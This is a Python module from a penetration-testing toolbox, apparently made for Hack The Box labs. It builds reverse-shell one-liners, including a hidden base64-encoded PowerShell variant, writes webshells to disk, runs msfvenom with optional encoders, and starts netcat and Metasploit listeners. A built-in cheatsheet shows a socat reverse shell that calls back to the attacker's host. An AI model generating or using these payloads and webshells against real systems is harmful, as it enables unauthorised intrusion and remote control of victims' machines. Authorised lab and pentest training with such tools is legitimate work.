"""
HTB Toolbox — Payloads & Reverse Shells Screens
"""
import os
import base64
import subprocess

from ui.helpers import (
    console, pause, ask, ask_int, show_error, show_success, show_info,
    menu_header, render_menu, choose, get_project_or_warn,
)
from core.project import save_project, get_project_output_dir
from core.config import (
    REVERSE_SHELL_TEMPLATES, WEBSHELL_TEMPLATES, MSFVENOM_PRESETS,
    DEFAULT_LPORT, get_tun0_ip,
)
from core.logger import ActivityLogger
from rich.panel import Panel
from rich.table import Table


SHELL_STABILIZE = """[bold cyan]Shell Stabilization Commands:[/]

[yellow]Python PTY upgrade:[/]
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  Ctrl+Z
  stty raw -echo; fg
  export TERM=xterm-256color

[yellow]Script method:[/]
  script /dev/null -c bash

[yellow]Socat upgrade:[/]
  # Attacker: socat file:`tty`,raw,echo=0 tcp-listen:4444
  # Target:   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:4444

[yellow]Fix terminal size:[/]
  stty rows 40 cols 160"""


def _get_lhost():
    ip = get_tun0_ip()
    if ip:
        console.print(f"  [dim]Auto-detected tun0: {ip}[/]")
        return ask("LHOST", ip)
    return ask("LHOST (your IP)")


def menu_payload():
    while True:
        menu_header()
        items = [
            ("1", "🐚", "Reverse Shell Generator"),
            ("2", "🎯", "Msfvenom Payload Builder"),
            ("3", "🌐", "Webshell Generator"),
            ("4", "🎧", "Start Netcat Listener"),
            ("5", "💎", "Start Metasploit Handler"),
            ("6", "📋", "List All Payload Types"),
            ("7", "⬆️ ", "Shell Stabilization Cheatsheet"),
        ]
        render_menu("Payloads & Reverse Shells", items)
        c = choose(items)
        if c == "0": return
        elif c == "1": action_reverse_shell()
        elif c == "2": action_msfvenom()
        elif c == "3": action_webshell()
        elif c == "4": action_listener()
        elif c == "5": action_msf_handler()
        elif c == "6": action_list_payloads()
        elif c == "7": action_shell_stabilize()


def action_reverse_shell():
    data = get_project_or_warn()
    if not data:
        return

    menu_header("Reverse Shell Generator")
    shell_types = sorted(REVERSE_SHELL_TEMPLATES.keys())

    # Display available types in columns
    table = Table(show_header=False, box=None, padding=(0, 4))
    table.add_column(width=25)
    table.add_column(width=25)
    table.add_column(width=25)
    for i in range(0, len(shell_types), 3):
        row = []
        for j in range(3):
            if i + j < len(shell_types):
                row.append(f"[cyan]{i + j + 1:2}[/]. {shell_types[i + j]}")
            else:
                row.append("")
        table.add_row(*row)
    console.print(table)

    idx = ask_int(f"\n  Shell type (1-{len(shell_types)})", 1)
    if idx < 1 or idx > len(shell_types):
        show_error("Invalid selection.")
        pause()
        return

    shell_type = shell_types[idx - 1]
    lhost = _get_lhost()
    lport = ask_int("LPORT", DEFAULT_LPORT)

    if not lhost:
        show_error("LHOST is required.")
        pause()
        return

    # Generate
    if shell_type == "powershell-base64":
        ps_cmd = REVERSE_SHELL_TEMPLATES["powershell"].format(lhost=lhost, lport=lport)
        encoded = base64.b64encode(ps_cmd.encode("utf-16-le")).decode()
        payload = f"powershell -nop -w hidden -enc {encoded}"
    else:
        template = REVERSE_SHELL_TEMPLATES[shell_type]
        payload = template.format(lhost=lhost, lport=lport)

    console.print(Panel(
        f"[bold green]{payload}[/]",
        title=f"[bold]🐚 {shell_type} Reverse Shell[/]",
        border_style="green", padding=(1, 2),
    ))

    # Base64 encoded version
    b64 = base64.b64encode(payload.encode()).decode()
    console.print(Panel(
        f"[bold cyan]echo {b64} | base64 -d | bash[/]",
        title="[bold]Base64 Encoded[/]", border_style="cyan",
    ))

    console.print(f"\n  [dim]💡 Start listener: [bold]nc -lvnp {lport}[/][/]")

    logger = ActivityLogger(data)
    logger.log_payload(shell_type, details=f"Generated {shell_type} → {lhost}:{lport}")
    save_project(data)
    pause()


def action_msfvenom():
    data = get_project_or_warn()
    if not data:
        return

    menu_header("Msfvenom Payload Builder")

    console.print("  [bold]Available presets:[/]\n")
    presets = sorted(MSFVENOM_PRESETS.keys())
    for i, name in enumerate(presets, 1):
        info = MSFVENOM_PRESETS[name]
        console.print(f"    [cyan]{i:2}[/]. {name:<22} [dim]{info['payload']}[/]")
    console.print(f"\n    [cyan]{len(presets) + 1:2}[/]. Custom payload\n")

    idx = ask_int("Selection", 1)
    lhost = _get_lhost()
    lport = ask_int("LPORT", DEFAULT_LPORT)

    if not lhost:
        show_error("LHOST is required.")
        pause()
        return

    if idx <= len(presets):
        preset_name = presets[idx - 1]
        preset = MSFVENOM_PRESETS[preset_name]
        payload_str = preset["payload"]
        fmt = preset["format"]
        outfile = f"shell_{preset_name}.{preset['extension']}"
    else:
        payload_str = ask("Payload string (e.g. linux/x64/shell_reverse_tcp)")
        fmt = ask("Format (elf, exe, raw, war, asp, aspx, php)", "elf")
        outfile = ask("Output filename", f"payload.{fmt}")
        if not payload_str:
            return

    output_dir = get_project_output_dir(data["name"])
    outpath = output_dir / outfile

    encoder = ask("Encoder (leave empty for none)", "")
    iterations = 1
    if encoder:
        iterations = ask_int("Encoding iterations", 3)

    from ui.helpers import check_tool_installed
    if not check_tool_installed("msfvenom"):
        return

    cmd = ["msfvenom", "-p", payload_str, f"LHOST={lhost}", f"LPORT={lport}",
           "-f", fmt]
    if encoder:
        cmd.extend(["-e", encoder, "-i", str(iterations)])
    cmd.extend(["-o", str(outpath)])

    console.print(f"\n  [bold cyan]⚡ Running:[/] [dim]{' '.join(cmd)}[/]\n")
    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

    if proc.returncode == 0:
        show_success(f"Payload generated: [cyan]{outpath}[/]")
        if proc.stdout:
            console.print(f"  [dim]{proc.stdout.strip()}[/]")
        if fmt == "elf":
            os.chmod(outpath, 0o755)

        console.print(f"\n  [dim]💡 Handler: msfconsole -q -x \"use multi/handler; "
                      f"set PAYLOAD {payload_str}; set LHOST {lhost}; set LPORT {lport}; run\"[/]")
    else:
        show_error(f"msfvenom failed: {proc.stderr}")

    logger = ActivityLogger(data)
    logger.log_payload("msfvenom", details=f"Generated {payload_str}", output_file=str(outpath))
    save_project(data)
    pause()


def action_webshell():
    data = get_project_or_warn()
    if not data:
        return

    menu_header("Webshell Generator")
    shell_types = sorted(WEBSHELL_TEMPLATES.keys())
    for i, name in enumerate(shell_types, 1):
        console.print(f"    [cyan]{i}[/]. {name}")

    idx = ask_int(f"Shell type (1-{len(shell_types)})", 1)
    if idx < 1 or idx > len(shell_types):
        show_error("Invalid selection.")
        pause()
        return

    shell_type = shell_types[idx - 1]
    content = WEBSHELL_TEMPLATES[shell_type]
    ext = shell_type.split("-")[0]

    output_dir = get_project_output_dir(data["name"])
    outfile = ask("Output filename", f"webshell.{ext}")
    outpath = output_dir / outfile

    with open(outpath, "w") as f:
        f.write(content)

    show_success(f"Webshell generated: [cyan]{outpath}[/]")
    console.print(Panel(content, title=f"[bold]{shell_type}[/]", border_style="yellow"))
    console.print(f"\n  [dim]💡 Usage: curl 'http://target/{outfile}?cmd=id'[/]")

    logger = ActivityLogger(data)
    logger.log_payload("webshell", details=f"Generated {shell_type}", output_file=str(outpath))
    save_project(data)
    pause()


def action_listener():
    data = get_project_or_warn()
    if not data:
        return

    menu_header("Start Netcat Listener")
    lport = ask_int("Port to listen on", DEFAULT_LPORT)

    lhost = get_tun0_ip() or "0.0.0.0"
    console.print(f"\n  [bold green]🎧 Starting listener on {lhost}:{lport}[/]")
    console.print("  [dim]Press Ctrl+C to stop and return to menu.[/]\n")

    logger = ActivityLogger(data)
    logger.log_payload("listener", details=f"Started nc listener on port {lport}")
    save_project(data)

    from ui.helpers import check_tool_installed
    if not check_tool_installed("nc"):
        return

    # Use rlwrap if available
    cmd = ["nc", "-lvnp", str(lport)]
    if subprocess.run(["which", "rlwrap"], capture_output=True).returncode == 0:
        cmd = ["rlwrap"] + cmd

    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        console.print("\n  [dim]Listener stopped.[/]")
    pause()


def action_msf_handler():
    data = get_project_or_warn()
    if not data:
        return

    menu_header("Start Metasploit Handler")

    console.print("  [bold]Quick presets:[/]")
    console.print("    [cyan]1[/]. windows/x64/meterpreter/reverse_tcp")
    console.print("    [cyan]2[/]. linux/x64/meterpreter/reverse_tcp")
    console.print("    [cyan]3[/]. windows/x64/shell_reverse_tcp")
    console.print("    [cyan]4[/]. linux/x64/shell_reverse_tcp")
    console.print("    [cyan]5[/]. Custom\n")

    presets = {
        "1": "windows/x64/meterpreter/reverse_tcp",
        "2": "linux/x64/meterpreter/reverse_tcp",
        "3": "windows/x64/shell_reverse_tcp",
        "4": "linux/x64/shell_reverse_tcp",
    }
    c = ask("Selection", "1")
    if c == "5":
        payload = ask("Payload string")
    else:
        payload = presets.get(c, presets["1"])

    lhost = _get_lhost()
    lport = ask_int("LPORT", DEFAULT_LPORT)

    if not lhost:
        return

    output_dir = get_project_output_dir(data["name"])
    rc_file = output_dir / "handler.rc"
    rc_content = (
        f"use exploit/multi/handler\n"
        f"set PAYLOAD {payload}\n"
        f"set LHOST {lhost}\n"
        f"set LPORT {lport}\n"
        f"set ExitOnSession false\n"
        f"exploit -j -z\n"
    )
    with open(rc_file, "w") as f:
        f.write(rc_content)

    console.print(f"\n  [bold green]🎯 Launching Metasploit handler[/]")
    console.print(f"  [dim]Payload: {payload} | LHOST={lhost} | LPORT={lport}[/]")
    console.print("  [dim]Press Ctrl+C or type 'exit' to return.[/]\n")

    logger = ActivityLogger(data)
    logger.log_payload("msflistener", details=f"Started {payload} handler on {lport}")
    save_project(data)

    from ui.helpers import check_tool_installed
    if not check_tool_installed("msfconsole"):
        return

    try:
        subprocess.run(["msfconsole", "-q", "-r", str(rc_file)])
    except KeyboardInterrupt:
        console.print("\n  [dim]Handler stopped.[/]")
    pause()


def action_list_payloads():
    menu_header("All Payload Types")

    t1 = Table(title="🐚 Reverse Shell Types", header_style="bold cyan")
    t1.add_column("Type", style="yellow")
    for name in sorted(REVERSE_SHELL_TEMPLATES.keys()):
        t1.add_row(name)
    console.print(t1)

    t2 = Table(title="🌐 Webshell Types", header_style="bold cyan")
    t2.add_column("Type", style="yellow")
    for name in sorted(WEBSHELL_TEMPLATES.keys()):
        t2.add_row(name)
    console.print(t2)

    t3 = Table(title="🎯 Msfvenom Presets", header_style="bold cyan")
    t3.add_column("Preset", style="yellow")
    t3.add_column("Payload", style="white")
    t3.add_column("Format", style="dim")
    for name, info in sorted(MSFVENOM_PRESETS.items()):
        t3.add_row(name, info["payload"], info["format"])
    console.print(t3)
    pause()


def action_shell_stabilize():
    menu_header("Shell Stabilization Cheatsheet")
    console.print(Panel(SHELL_STABILIZE, border_style="cyan", padding=(1, 2)))
    pause()
